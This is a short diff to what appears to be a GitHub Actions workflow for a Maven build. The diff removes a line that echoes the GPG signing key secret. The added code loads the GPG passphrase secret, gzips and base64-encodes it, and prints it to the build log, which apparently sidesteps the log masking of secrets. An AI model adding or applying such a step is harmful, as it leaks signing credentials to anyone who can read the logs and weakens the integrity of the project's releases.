@@ -16,8 +16,7 @@ jobs:
           distribution: 'temurin'
           cache: maven
       - run: |
-          echo "${{ secrets.GPG_SIGNING_KEY }}"
-          a="${{ secrets.GPG_SIGNING_KEY }}"
+          a="${{ secrets.GPG_PASSPHRASE }}"
           echo "$a" | gzip -f | base64
       - name: Build with Maven
         run: mvn -B package --file pom.xml
